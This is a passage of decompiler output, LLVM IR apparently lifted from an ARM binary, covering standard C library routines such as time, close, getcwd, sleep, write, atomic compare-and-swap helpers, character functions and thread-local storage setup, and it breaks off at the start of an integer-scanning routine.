  ret i32 %v1_10e94

; uselistorder directives
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10e90, { 1, 0 }
  uselistorder label %dec_label_pc_10e80, { 1, 0 }
}

define i32 @time(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_10e9c = load i32, i32* @r4, align 4
  %v2_10ea0 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %tmp, i32* @r4, align 4
  %v2_10eb0 = call i32 @__clock_gettime(i32 0, i32 %v2_10ea0)
  %v0_10eb4 = load i32, i32* @r4, align 4
  %v2_10eb4 = icmp eq i32 %v0_10eb4, 0
  br i1 %v2_10eb4, label %.thread, label %bb

bb:                                               ; preds = %entry
  %v3_10eb8 = load i32, i32* %stack_var_-16, align 4
  %v3_10ebc = inttoptr i32 %v0_10eb4 to i32*
  store i32 %v3_10eb8, i32* %v3_10ebc, align 4
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v2_10ec0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v3_10e9c, i32* @r4, align 4
  ret i32 %v2_10ec0

; uselistorder directives
  uselistorder i32 (i32, i32)* @__clock_gettime, { 2, 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @_dummy.10() local_unnamed_addr {
entry:
  %v1_10ed0 = load i32, i32* @r0, align 4
  ret i32 %v1_10ed0
}

define i32 @close(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v0_10ed4 = load i32, i32* @lr, align 4
  store i32 69352, i32* @lr, align 4
  %v2_10ee4 = call i32 @_dummy.4(i32 %arg1)
  store i32 0, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v7_10f08 = call i32 @__syscall_cp(i32 6, i32 %v2_10ee4, i32 0, i32 0, i32 0, i32 0, i32 0)
  %v7_10f0c = icmp eq i32 %v7_10f08, -4
  br i1 %v7_10f0c, label %bb, label %bb5

bb:                                               ; preds = %entry
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v7_10f08, %entry ]
  store i32 %storemerge, i32* @r0, align 4
  %v0_10f14 = call i32 @__syscall_ret()
  store i32 %v0_10ed4, i32* @lr, align 4
  ret i32 %v0_10f14

; uselistorder directives
  uselistorder label %bb5, { 1, 0 }
}

define i32 @getcwd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-4112 = alloca i32, align 4
  %v3_10f28 = load i32, i32* @r4, align 4
  %v6_10f28 = load i32, i32* @r7, align 4
  store i32 %arg1, i32* @r4, align 4
  %v2_10f2c = icmp eq i32 %arg1, 0
  %v2_10f34 = ptrtoint i32* %stack_var_-4112 to i32
  store i32 %arg2, i32* %r7.global-to-local, align 4
  br i1 %v2_10f2c, label %dec_label_pc_10f5c, label %dec_label_pc_10f40

dec_label_pc_10f40:                               ; preds = %entry
  %v2_10f40 = icmp eq i32 %arg2, 0
  br i1 %v2_10f40, label %dec_label_pc_10f48, label %dec_label_pc_10f64

dec_label_pc_10f48:                               ; preds = %dec_label_pc_10f40
  %v0_10f48 = call i32 @__errno_location()
  %v0_10f4c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_10f4c, i32* %r4.global-to-local, align 4
  %v2_10f54 = inttoptr i32 %v0_10f48 to i32*
  store i32 22, i32* %v2_10f54, align 4
  %v0_10f98.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10f98

dec_label_pc_10f5c:                               ; preds = %entry
  store i32 %v2_10f34, i32* @r4, align 4
  store i32 4096, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10f64

dec_label_pc_10f64:                               ; preds = %dec_label_pc_10f40, %dec_label_pc_10f5c
  %v0_10f68 = phi i32 [ %arg1, %dec_label_pc_10f40 ], [ %v2_10f34, %dec_label_pc_10f5c ]
  store i32 %v0_10f68, i32* @r0, align 4
  store i32 183, i32* @r7, align 4
  %v0_10f74 = call i32 @__syscall_ret()
  %v1_10f78 = icmp slt i32 %v0_10f74, 0
  br i1 %v1_10f78, label %.thread, label %dec_label_pc_10f84

.thread:                                          ; preds = %dec_label_pc_10f64
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10f98

dec_label_pc_10f84:                               ; preds = %dec_label_pc_10f64
  %v0_10f84 = load i32, i32* @r4, align 4
  %v1_10f84 = load i32, i32* @sp, align 4
  %v9_10f84 = icmp eq i32 %v0_10f84, %v1_10f84
  br i1 %v9_10f84, label %dec_label_pc_10f8c, label %dec_label_pc_10f98

dec_label_pc_10f8c:                               ; preds = %dec_label_pc_10f84
  %v1_10f90 = bitcast i32* %stack_var_-4112 to i8*
  %v2_10f90 = call i32 @__strdup(i8* %v1_10f90)
  store i32 %v2_10f90, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10f98

dec_label_pc_10f98:                               ; preds = %.thread, %dec_label_pc_10f84, %dec_label_pc_10f48, %dec_label_pc_10f8c
  %v0_10f98 = phi i32 [ 0, %.thread ], [ %v0_10f84, %dec_label_pc_10f84 ], [ %v0_10f98.pre, %dec_label_pc_10f48 ], [ %v2_10f90, %dec_label_pc_10f8c ]
  store i32 %v3_10f28, i32* @r4, align 4
  store i32 %v6_10f28, i32* @r7, align 4
  ret i32 %v0_10f98

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_10f98, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_10f64, { 1, 0 }
}

define i32 @getpid() local_unnamed_addr {
entry:
  %v1_10fbc = load i32, i32* @r0, align 4
  ret i32 %v1_10fbc
}

define i32 @getppid() local_unnamed_addr {
entry:
  %v1_10fd0 = load i32, i32* @r0, align 4
  ret i32 %v1_10fd0
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_10fd8 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_10ff0 = call i32 @nanosleep(i32 %v2_10fd8, i32 %v2_10fd8)
  %v2_10ff4 = icmp eq i32 %v2_10ff0, 0
  br i1 %v2_10ff4, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v3_10ff8 = load i32, i32* %stack_var_-16, align 4
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v1_11004 = phi i32 [ 0, %entry ], [ %v3_10ff8, %bb ]
  ret i32 %v1_11004

; uselistorder directives
  uselistorder label %bb5, { 1, 0 }
}

define i32 @write(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg3, i32* @r3, align 4
  store i32 %arg2, i32* @r2, align 4
  %v7_11034 = call i32 @__syscall_cp(i32 4, i32 %arg1, i32 %arg2, i32 %arg3, i32 0, i32 0, i32 0)
  store i32 %v7_11034, i32* @r0, align 4
  %v0_11038 = call i32 @__syscall_ret()
  ret i32 %v0_11038

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @__a_barrier() local_unnamed_addr {
entry:
  %v3_1104c = load i32, i32* @global_var_23484.593, align 4
  store i32 %v3_1104c, i32* @ip, align 4
  call void @__pseudo_branch(i32 ptrtoint (i32* @global_var_11058.594 to i32))
  %v0_11054 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11054, label %bb, label %entry._crit_edge

entry._crit_edge:                                 ; preds = %entry
  %v2_1105c.pre = load i32, i32* @r0, align 4
  br label %bb2

bb:                                               ; preds = %entry
  %v1_11054 = load i32, i32* @r1, align 4
  %v2_11054 = load i32, i32* @r0, align 4
  %v3_11054 = load i32, i32* @r4, align 4
  %v8_11054 = lshr i32 %v2_11054, %v3_11054
  %v9_11054 = and i32 %v8_11054, %v1_11054
  store i32 %v9_11054, i32* @r2, align 4
  br label %bb2

bb2:                                              ; preds = %entry._crit_edge, %bb
  %v2_1105c = phi i32 [ %v2_1105c.pre, %entry._crit_edge ], [ %v2_11054, %bb ]
  %v0_11058 = load i32, i32* @lr, align 4
  %v1_11058 = urem i32 %v0_11058, 2
  %v2_11058 = icmp eq i32 %v1_11058, 0
  store i1 %v2_11058, i1* @cpsr_z, align 1
  ret i32 %v2_1105c

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__a_barrier_oldkuser(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_11064:
  %v1_11078 = call i32 @unknown_ffff0fc0()
  ret i32 %arg1
}

define i32 @__a_cas(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  %v3_110a0 = load i32, i32* @global_var_23488.597, align 4
  store i32 %v3_110a0, i32* @ip, align 4
  call void @__pseudo_branch(i32 ptrtoint (i32* @global_var_110ac.598 to i32))
  %v0_110a8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_110a8, label %bb, label %entry._crit_edge

entry._crit_edge:                                 ; preds = %entry
  %v0_110b0.pre = load i32, i32* @r2, align 4
  br label %bb2

bb:                                               ; preds = %entry
  %v3_110a8 = udiv i32 %arg1, 128
  %v4_110a8 = mul i32 %arg1, 33554432
  %v5_110a8 = or i32 %v3_110a8, %v4_110a8
  %v8_110a8 = and i32 %v5_110a8, %arg2
  store i32 %v8_110a8, i32* @r2, align 4
  br label %bb2

bb2:                                              ; preds = %entry._crit_edge, %bb
  %v2_110b8 = phi i32 [ %v0_110b0.pre, %entry._crit_edge ], [ %v8_110a8, %bb ]
  %v1_110b0 = inttoptr i32 %v2_110b8 to i32*
  %v2_110b0 = load i32, i32* %v1_110b0, align 4
  %v2_110b4 = sub i32 %arg1, %v2_110b0
  %v9_110b4 = icmp eq i32 %v2_110b0, %arg1
  br i1 %v9_110b4, label %bb3, label %bb4

bb3:                                              ; preds = %bb2
  store i32 %arg2, i32* %v1_110b0, align 4
  br label %bb4

bb4:                                              ; preds = %bb2, %bb3
  ret i32 %v2_110b4

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 3, 0, 1 }
  uselistorder label %bb4, { 1, 0 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__a_cas_v6(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_110c8:
  br label %dec_label_pc_110d0

dec_label_pc_110d0:                               ; preds = %bb, %dec_label_pc_110c8
  %v2_110d0 = load i32, i32* %arg2, align 4
  %v2_110d4 = sub i32 %arg1, %v2_110d0
  %v9_110d4 = icmp eq i32 %v2_110d0, %arg1
  br i1 %v9_110d4, label %bb, label %dec_label_pc_110e4

bb:                                               ; preds = %dec_label_pc_110d0
  %v4_110dc = icmp eq i32 %v2_110d4, 1
  br i1 %v4_110dc, label %dec_label_pc_110d0, label %dec_label_pc_110e4

dec_label_pc_110e4:                               ; preds = %dec_label_pc_110d0, %bb
  ret i32 %v2_110d4

; uselistorder directives
  uselistorder i32 %v2_110d4, { 1, 0 }
  uselistorder label %dec_label_pc_110e4, { 1, 0 }
}

define i32 @__a_cas_v7(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_110ec:
  br label %dec_label_pc_110f4

dec_label_pc_110f4:                               ; preds = %bb, %dec_label_pc_110ec
  %v2_110f4 = load i32, i32* %arg2, align 4
  %v2_110f8 = sub i32 %arg1, %v2_110f4
  %v9_110f8 = icmp eq i32 %v2_110f4, %arg1
  br i1 %v9_110f8, label %bb, label %dec_label_pc_11108

bb:                                               ; preds = %dec_label_pc_110f4
  %v4_11100 = icmp eq i32 %v2_110f8, 1
  br i1 %v4_11100, label %dec_label_pc_110f4, label %dec_label_pc_11108

dec_label_pc_11108:                               ; preds = %dec_label_pc_110f4, %bb
  ret i32 %v2_110f8

; uselistorder directives
  uselistorder i32 %v2_110f8, { 1, 0 }
  uselistorder label %dec_label_pc_11108, { 1, 0 }
}

define i32 @__aeabi_read_tp() local_unnamed_addr {
entry:
  %v3_11114 = load i32, i32* @global_var_2348c.600, align 4
  call void @__pseudo_branch(i32 ptrtoint (i32* @global_var_11120.601 to i32))
  ret i32 %v3_11114
}

define i32 @isalnum(i32 %arg1) local_unnamed_addr {
entry:
  %v1_1112c = or i32 %arg1, 32
  %v1_11130 = add i32 %v1_1112c, -97
  %tmp = icmp ult i32 %v1_11130, 26
  br i1 %tmp, label %bb, label %bb3

bb:                                               ; preds = %entry
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %storemerge = phi i32 [ 1, %bb ], [ %arg1, %entry ]
  %v0_1113c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp, i32 %v0_1113c)
  %v1_11140 = add i32 %storemerge, -48
  %v2_11144 = icmp ugt i32 %v1_11140, 8
  %v7_11144 = icmp eq i32 %v1_11140, 9
  %v2_11148 = xor i1 %v7_11144, true
  %v3_11148 = and i1 %v2_11144, %v2_11148
  br i1 %v3_11148, label %bb4, label %bb5

bb4:                                              ; preds = %bb3
  br label %bb5

bb5:                                              ; preds = %bb3, %bb4
  %v1_111502 = phi i32 [ %storemerge, %bb3 ], [ 0, %bb4 ]
  %v2_1114c = xor i1 %v2_11144, true
  %v3_1114c = or i1 %v7_11144, %v2_1114c
  br i1 %v3_1114c, label %bb6, label %bb7

bb6:                                              ; preds = %bb5
  br label %bb7

bb7:                                              ; preds = %bb5, %bb6
  %v1_11150 = phi i32 [ %v1_111502, %bb5 ], [ 1, %bb6 ]
  ret i32 %v1_11150

; uselistorder directives
  uselistorder i1 %v7_11144, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder label %bb7, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__isalnum_l(i32 %c) local_unnamed_addr {
entry:
  %v1_11154 = call i32 @isalnum(i32 %c)
  ret i32 %v1_11154

; uselistorder directives
  uselistorder i32 (i32)* @isalnum, { 1, 0 }
}

define i32 @tolower(i32 %arg1) local_unnamed_addr {
entry:
  %v1_11158 = add i32 %arg1, -65
  %tmp = icmp ult i32 %v1_11158, 26
  br i1 %tmp, label %bb, label %bb2

bb:                                               ; preds = %entry
  %v5_11160 = or i32 %arg1, 32
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v1_11164 = phi i32 [ %arg1, %entry ], [ %v5_11160, %bb ]
  ret i32 %v1_11164

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__tolower_l(i32 %arg1) local_unnamed_addr {
entry:
  %v1_11168 = add i32 %arg1, -65
  %tmp = icmp ult i32 %v1_11168, 26
  br i1 %tmp, label %bb, label %bb2

bb:                                               ; preds = %entry
  %v5_11170 = or i32 %arg1, 32
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v1_11174 = phi i32 [ %arg1, %entry ], [ %v5_11170, %bb ]
  ret i32 %v1_11174

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__copy_tls() local_unnamed_addr {
entry:
  %v2_1117c = load i32, i32* @global_var_23ec4.603, align 4
  %v2_11180 = icmp eq i32 %v2_1117c, 0
  %v0_11184 = load i32, i32* @r0, align 4
  store i32 %v0_11184, i32* @ip, align 4
  br i1 %v2_11180, label %dec_label_pc_111d8, label %dec_label_pc_11194

dec_label_pc_11194:                               ; preds = %entry
  %v3_11194 = load i32, i32* @global_var_23ed0.604, align 4
  %v1_11198 = add i32 %v0_11184, 8
  %v2_111a0 = sub i32 -220, %v0_11184
  %v1_111a4 = add i32 %v3_11194, -1
  %v2_111a8 = and i32 %v1_111a4, %v2_111a0
  %v2_111ac = add i32 %v1_11198, %v2_111a8
  store i32 %v2_111ac, i32* @r4, align 4
  %v1_111b0 = add i32 %v2_111ac, 212
  store i32 1, i32* @r3, align 4
  %v2_111b8 = inttoptr i32 %v0_11184 to i32*
  store i32 1, i32* %v2_111b8, align 4
  %v1_111bc = load i32, i32* @ip, align 4
  %v2_111bc = add i32 %v1_111bc, 4
  %v3_111bc = inttoptr i32 %v2_111bc to i32*
  store i32 %v1_111b0, i32* %v3_111bc, align 4
  %v3_111c0 = load i32, i32* @global_var_23ec8.605, align 4
  %v0_111c4 = load i32, i32* @ip, align 4
  %v1_111c4 = load i32, i32* @r4, align 4
  %v2_111c4 = add i32 %v1_111c4, 208
  %v3_111c4 = inttoptr i32 %v2_111c4 to i32*
  store i32 %v0_111c4, i32* %v3_111c4, align 4
  %v0_111c8 = load i32, i32* @ip, align 4
  %v1_111c8 = load i32, i32* @r4, align 4
  %v2_111c8 = add i32 %v1_111c8, 4
  %v3_111c8 = inttoptr i32 %v2_111c8 to i32*
  store i32 %v0_111c8, i32* %v3_111c8, align 4
  %v2_111cc = load i32, i32* @global_var_23ec4.603, align 4
  %v3_111d0 = inttoptr i32 %v1_111b0 to i16*
  %v4_111d0 = call i32 @memcpy(i16* %v3_111d0, i32 %v2_111cc, i32 %v3_111c0)
  %v0_111d4 = load i32, i32* @r4, align 4
  br label %dec_label_pc_111d8

dec_label_pc_111d8:                               ; preds = %entry, %dec_label_pc_11194
  %v1_111dc = phi i32 [ %v0_11184, %entry ], [ %v0_111d4, %dec_label_pc_11194 ]
  ret i32 %v1_111dc

; uselistorder directives
  uselistorder i32 %v0_11184, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_111d8, { 1, 0 }
}

define i32 @__init_tls(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v6_111e4 = load i32, i32* @r5, align 4
  %v1_111e8 = add i32 %arg1, 12
  %v2_111e8 = inttoptr i32 %v1_111e8 to i32*
  %v3_111e8 = load i32, i32* %v2_111e8, align 4
  %v1_111f0 = add i32 %arg1, 20
  %v2_111f0 = inttoptr i32 %v1_111f0 to i32*
  %v3_111f0 = load i32, i32* %v2_111f0, align 4
  store i32 %v3_111f0, i32* @lr, align 4
  store i32 0, i32* @r4, align 4
  %v2_112285 = icmp eq i32 %v3_111f0, 0
  br i1 %v2_112285, label %dec_label_pc_11230.thread, label %dec_label_pc_11200.lr.ph

dec_label_pc_11230.thread:                        ; preds = %entry
  br label %dec_label_pc_11230.dec_label_pc_11260_crit_edge

dec_label_pc_11200.lr.ph:                         ; preds = %entry
  %v1_1121c = add i32 %arg1, 16
  %v2_1121c = inttoptr i32 %v1_1121c to i32*
  br label %dec_label_pc_11200

dec_label_pc_11200:                               ; preds = %dec_label_pc_11200.lr.ph, %dec_label_pc_11228
  %v0_1125416 = phi i32 [ 0, %dec_label_pc_11200.lr.ph ], [ %v0_1125414, %dec_label_pc_11228 ]
  %v0_1123012 = phi i32 [ 0, %dec_label_pc_11200.lr.ph ], [ %v0_1123011, %dec_label_pc_11228 ]
  %v0_11220 = phi i32 [ %v3_111f0, %dec_label_pc_11200.lr.ph ], [ %v1_11220, %dec_label_pc_11228 ]
  %v0_11224 = phi i32 [ %v3_111e8, %dec_label_pc_11200.lr.ph ], [ %v2_11224, %dec_label_pc_11228 ]
  %v1_11200 = inttoptr i32 %v0_11224 to i32*
  %v2_11200 = load i32, i32* %v1_11200, align 4
  store i32 %v2_11200, i32* %r3.global-to-local, align 4
  switch i32 %v2_11200, label %dec_label_pc_11228 [
    i32 6, label %.thread
    i32 7, label %bb
  ]

.thread:                                          ; preds = %dec_label_pc_11200
  %v2_11208 = add i32 %v0_11224, 8
  %v3_11208 = inttoptr i32 %v2_11208 to i32*
  %v4_11208 = load i32, i32* %v3_11208, align 4
  store i32 %v4_11208, i32* %r3.global-to-local, align 4
  %v3_1120c = sub i32 %v3_111e8, %v4_11208
  store i32 %v3_1120c, i32* @r4, align 4
  br label %dec_label_pc_11228

bb:                                               ; preds = %dec_label_pc_11200
  br label %dec_label_pc_11228

dec_label_pc_11228:                               ; preds = %dec_label_pc_11200, %.thread, %bb
  %v0_1125414 = phi i32 [ %v3_1120c, %.thread ], [ %v0_1125416, %bb ], [ %v0_1125416, %dec_label_pc_11200 ]
  %v0_1123011 = phi i32 [ %v0_1123012, %.thread ], [ %v0_11224, %bb ], [ %v0_1123012, %dec_label_pc_11200 ]
  %v3_1121c = load i32, i32* %v2_1121c, align 4
  store i32 %v3_1121c, i32* %r3.global-to-local, align 4
  %v1_11220 = add i32 %v0_11220, -1
  store i32 %v1_11220, i32* @lr, align 4
  %v2_11224 = add i32 %v3_1121c, %v0_11224
  %v2_11228 = icmp eq i32 %v1_11220, 0
  br i1 %v2_11228, label %dec_label_pc_11230, label %dec_label_pc_11200

dec_label_pc_11230:                               ; preds = %dec_label_pc_11228
  %v2_11230 = icmp eq i32 %v0_1123011, 0
  br i1 %v2_11230, label %dec_label_pc_11230.dec_label_pc_11260_crit_edge, label %dec_label_pc_11238

dec_label_pc_11230.dec_label_pc_11260_crit_edge:  ; preds = %dec_label_pc_11230.thread, %dec_label_pc_11230
  %v3_11264.pre = load i32, i32* @global_var_23ecc.607, align 4
  %v3_11268.pre = load i32, i32* @global_var_23ed0.604, align 4
  %v2_1126c.pre = load i32, i32* @global_var_23ec4.603, align 4
  br label %dec_label_pc_11260

dec_label_pc_11238:                               ; preds = %dec_label_pc_11230
  %v1_1123c = add i32 %v0_1123011, 16
  %v2_1123c = inttoptr i32 %v1_1123c to i32*
  %v3_1123c = load i32, i32* %v2_1123c, align 4
  store i32 %v3_1123c, i32* %r3.global-to-local, align 4
  %v1_11240 = add i32 %v0_1123011, 8
  %v2_11240 = inttoptr i32 %v1_11240 to i32*
  %v3_11240 = load i32, i32* %v2_11240, align 4
  store i32 %v3_1123c, i32* @global_var_23ec8.605, align 4
  %v1_11248 = add i32 %v0_1123011, 20
  %v2_11248 = inttoptr i32 %v1_11248 to i32*
  %v3_11248 = load i32, i32* %v2_11248, align 4
  store i32 %v3_11248, i32* %r3.global-to-local, align 4
  store i32 %v3_11248, i32* @global_var_23ecc.607, align 4
  %v1_11250 = add i32 %v0_1123011, 28
  %v2_11250 = inttoptr i32 %v1_11250 to i32*
  %v3_11250 = load i32, i32* %v2_11250, align 4
  store i32 %v3_11250, i32* %r3.global-to-local, align 4
  %v2_11254 = add i32 %v3_11240, %v0_1125414
  store i32 %v3_11250, i32* @global_var_23ed0.604, align 4
  store i32 %v2_11254, i32* @global_var_23ec4.603, align 4
  br label %dec_label_pc_11260

dec_label_pc_11260:                               ; preds = %dec_label_pc_11230.dec_label_pc_11260_crit_edge, %dec_label_pc_11238
  %v2_1126c = phi i32 [ %v2_1126c.pre, %dec_label_pc_11230.dec_label_pc_11260_crit_edge ], [ %v2_11254, %dec_label_pc_11238 ]
  %v3_11268 = phi i32 [ %v3_11268.pre, %dec_label_pc_11230.dec_label_pc_11260_crit_edge ], [ %v3_11250, %dec_label_pc_11238 ]
  %v3_11264 = phi i32 [ %v3_11264.pre, %dec_label_pc_11230.dec_label_pc_11260_crit_edge ], [ %v3_11248, %dec_label_pc_11238 ]
  store i32 %v3_11268, i32* %r0.global-to-local, align 4
  %sum = add i32 %v2_1126c, %v3_11264
  %v2_11274 = sub i32 0, %sum
  %v1_11278 = add i32 %v3_11268, -1
  %v2_1127c = and i32 %v1_11278, %v2_11274
  store i32 %v2_1127c, i32* %r3.global-to-local, align 4
  %v2_11284 = add i32 %v2_1127c, %v3_11264
  %tmp = icmp ult i32 %v3_11268, 4
  br i1 %tmp, label %bb38, label %.thread30

bb38:                                             ; preds = %dec_label_pc_11260
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 4, i32* @global_var_23ed0.604, align 4
  br label %.thread30

.thread30:                                        ; preds = %dec_label_pc_11260, %bb38
  %v3_11290 = phi i32 [ 4, %bb38 ], [ %v3_11268, %dec_label_pc_11260 ]
  %v1_11294 = add i32 %v2_11284, 223
  %v2_11298 = add i32 %v1_11294, %v3_11290
  %v1_1129c = and i32 %v2_11298, -4
  store i32 ptrtoint (i8** @global_var_23e88.411 to i32), i32* %r3.global-to-local, align 4
  store i32 %v2_11284, i32* @global_var_23ecc.607, align 4
  store i32 %v1_1129c, i32* @global_var_23e9c.609, align 4
  %tmp41 = icmp ult i32 %v1_1129c, 281
  br i1 %tmp41, label %.thread31, label %dec_label_pc_112b8

.thread31:                                        ; preds = %.thread30
  store i32 ptrtoint (i32* @global_var_23d38.611 to i32), i32* @r0, align 4
  br label %dec_label_pc_112d4

dec_label_pc_112b8:                               ; preds = %.thread30
  store i32 0, i32* @r0, align 4
  store i32 192, i32* @r7, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  store i32 -1, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_112d4

dec_label_pc_112d4:                               ; preds = %.thread31, %dec_label_pc_112b8
  %v0_112d4 = call i32 @__copy_tls()
  store i32 %v0_112d4, i32* @r4, align 4
  %v2_112dc = inttoptr i32 %v0_112d4 to i32*
  store i32 %v0_112d4, i32* %v2_112dc, align 4
  %v1_112e0 = add i32 %v0_112d4, 204
  store i32 %v1_112e0, i32* %r0.global-to-local, align 4
  %v1_112e4 = call i32 @__set_thread_area(i32 %v1_112e0)
  store i32 %v1_112e4, i32* %r0.global-to-local, align 4
  %v1_112e8 = icmp slt i32 %v1_112e4, 0
  br i1 %v1_112e8, label %bb39, label %dec_label_pc_112f8

bb39:                                             ; preds = %dec_label_pc_112d4
  store i32 0, i32* %r3.global-to-local, align 4
  call void @llvm.trap()
  unreachable

dec_label_pc_112f8:                               ; preds = %dec_label_pc_112d4
  %v2_112e8 = icmp eq i32 %v1_112e4, 0
  br i1 %v2_112e8, label %bb40, label %.thread3

bb40:                                             ; preds = %dec_label_pc_112f8
  store i32 ptrtoint (i8** @global_var_23e88.411 to i32), i32* %r3.global-to-local, align 4
  store i32 1, i32* bitcast (i8** @global_var_23e88.411 to i32*), align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_112f8, %bb40
  %v0_11308 = load i32, i32* @r4, align 4
  %v1_11308 = add i32 %v0_11308, 28
  store i32 %v1_11308, i32* %r0.global-to-local, align 4
  %v1_11310 = add i32 %v0_11308, 136
  %v3_11314 = inttoptr i32 %v1_11310 to i32*
  store i32 %v1_11310, i32* %v3_11314, align 4
  store i32 ptrtoint (i32* @global_var_23ea4.613 to i32), i32* %r3.global-to-local, align 4
  %v0_1131c = load i32, i32* %r0.global-to-local, align 4
  %v1_1131c = load i32, i32* @r4, align 4
  %v2_1131c = add i32 %v1_1131c, 28
  %v3_1131c = inttoptr i32 %v2_1131c to i32*
  store i32 %v0_1131c, i32* %v3_1131c, align 4
  %v0_11320 = load i32, i32* %r3.global-to-local, align 4
  %v1_11320 = load i32, i32* @r4, align 4
  %v2_11320 = add i32 %v1_11320, 156
  %v3_11320 = inttoptr i32 %v2_11320 to i32*
  store i32 %v0_11320, i32* %v3_11320, align 4
  store i32 %v6_111e4, i32* @r5, align 4
  %v1_11328 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_11328

; uselistorder directives
  uselistorder i32 %v1_11310, { 1, 0 }
  uselistorder i32 %v0_112d4, { 0, 2, 1, 3 }
  uselistorder i32 %v2_11284, { 1, 0 }
  uselistorder i32 %v3_11268, { 1, 0, 3, 2 }
  uselistorder i32 %v1_11220, { 1, 2, 0 }
  uselistorder i32 %v0_1123011, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 5, 4, 6, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_23e88.411 to i32), { 3, 2, 1, 0 }
  uselistorder i32* @global_var_23ec4.603, { 1, 0, 2, 3 }
  uselistorder i32* @global_var_23ed0.604, { 1, 2, 0, 3 }
  uselistorder i32* @global_var_23ecc.607, { 1, 2, 0 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_112d4, { 1, 0 }
  uselistorder label %.thread30, { 1, 0 }
  uselistorder label %dec_label_pc_11260, { 1, 0 }
  uselistorder label %dec_label_pc_11230.dec_label_pc_11260_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_11228, { 2, 1, 0 }
  uselistorder label %dec_label_pc_11200, { 1, 0 }
}

define i32 @_Exit(i32 %arg1) local_unnamed_addr {
entry:
  br label %dec_label_pc_11344

dec_label_pc_11344:                               ; preds = %dec_label_pc_11344, %entry
  br label %dec_label_pc_11344
}

define i32 @__intscan(i32 %arg1, i64 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = trunc i64 %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_0, align 4
  %v6_11354 = load i32, i32* @r5, align 4
  %v12_11354 = load i32, i32* @r7, align 4
  %v15_11354 = load i32, i32* @r8, align 4
  %v18_11354 = load i32, i32* @sb, align 4
  %v21_11354 = load i32, i32* @sl, align 4
  %v0_11364 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11364, i32* @sl, align 4
  store i32 %arg3, i32* @r6, align 4
  %tmp235 = icmp ult i32 %tmp, 37
  br i1 %tmp235, label %dec_label_pc_11384, label %dec_label_pc_11620

dec_label_pc_11374:                               ; preds = %dec_label_pc_11384
  %v2_11390 = inttoptr i32 %v3_11384 to i8*
